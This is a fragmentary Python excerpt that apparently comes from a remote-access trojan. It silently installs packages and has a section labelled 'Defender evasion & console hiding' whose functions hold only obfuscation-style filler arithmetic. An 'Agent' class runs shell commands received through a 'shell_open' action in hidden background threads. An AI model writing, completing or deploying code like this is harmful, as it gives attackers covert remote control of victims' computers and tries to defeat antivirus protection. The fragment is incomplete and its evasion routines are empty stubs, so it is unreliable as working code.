...
for package in packages:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
...
# ══════════════════════════════════════════════════════════════════════════════
# 1.5. DEFENDER EVASION & CONSOLE HIDING
# ══════════════════════════════════════════════════════════════════════════════
def _disable_defender():
    _obf_seed = (0xc0ffee ^ 0xdeadbeef) & 0xffffffff
    _ = (_obf_seed >> 16) & 0xff
...
def _hide_console():
    _obf_hide = (0xdeadbeef ^ 0xcafebabe) & 0xffffffff
    _ = (_obf_hide << 8) & 0xff
...
class Agent:
    ...
    def _route_one(self, cmd):
        ...
        if action == "shell_open":
            ...
            shell_type = arg.split(":", 1)[0] if ":" in arg else "bash"
            shell_cmd = arg.split(":", 1)[1] if ":" in arg else arg
            if shell_cmd:
                threading.Thread(target=self.shell.run, args=(shell_cmd,), daemon=True).start()
